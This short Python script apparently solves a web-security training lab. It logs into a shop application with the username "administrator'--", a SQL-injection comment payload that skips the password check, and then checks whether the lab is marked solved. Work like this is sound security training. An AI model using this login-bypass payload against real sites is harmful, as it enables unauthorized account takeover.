import sys
import logging
import urllib3

import requests

import utils            # code to this script was written by @tjc_  https://youtu.be/YYsZpJ83azQ
from shop import Shop   # Shop class also written by @tjc_ 

log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format="{asctime} [{threadName}][{levelname}][{name}] {message}",
    style="{",
    datefmt="%H:%M:%S",
)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def main(args):
    session = requests.Session()  # keep track of cookies 
    shop = Shop(args.url, args.no_proxy, session)  # login url build into the Class and this object 
    shop.login("administrator'--","password")
    utils.is_solved(shop.base_url, args.no_proxy)


if __name__ == "__main__":
    args = utils.parse_args(sys.argv)
    main(args)
